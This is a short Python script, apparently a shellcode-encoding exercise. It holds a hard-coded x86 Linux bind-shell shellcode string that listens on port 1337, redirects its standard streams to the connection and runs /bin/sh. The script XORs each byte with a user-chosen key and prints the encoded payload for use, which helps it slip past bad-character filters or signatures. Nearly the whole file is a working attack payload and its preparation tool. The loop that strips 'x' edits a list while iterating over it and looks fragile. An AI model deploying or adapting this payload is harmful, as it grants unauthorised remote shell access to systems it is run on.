
shellcode = "x31xf6x31xdbx31xc9x31xd2x31xc0x31xffxb0x66xb3x01x56x6ax01x6ax02x89xe1xcdx80x89xc2x31xc0x56x66x68x05x39x66x6ax02x89xe1x6ax10x51x52x89xe1xb0x66xb3x02xcdx80xb0x66xb3x04x56x52x89xe1xcdx80xb0x66xb3x05x56x56x52x89xe1xcdx80x89xc7x31xc9x31xc0xb0x3fx89xfbxb1x00xcdx80xb0x3fxb1x01xcdx80xb0x3fxb1x02xcdx80x31xc0x31xf6xb0x0bx56x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x89xf1x89xf2xcdx80"

#   shellcode = input("Enter shellcode")

value = input("Enter value in hex to xor shellcode ")

if value in shellcode:
    print("operand is already in shellcode , on xor gives u a null byte , choose another operand")


hex_dump = list(shellcode)

for i in hex_dump:
    if i=='x':
        hex_dump.remove(i)
    
s = []

for i in range(0,len(hex_dump),2):
    temp = "".join(hex_dump[i:i+2])
    s.append(temp)


res = ''


for i in s:
    temp = int(value,16) ^ int(i,16)
    temp = hex(temp)
    res += '\\'+ temp[1:]

print(res)










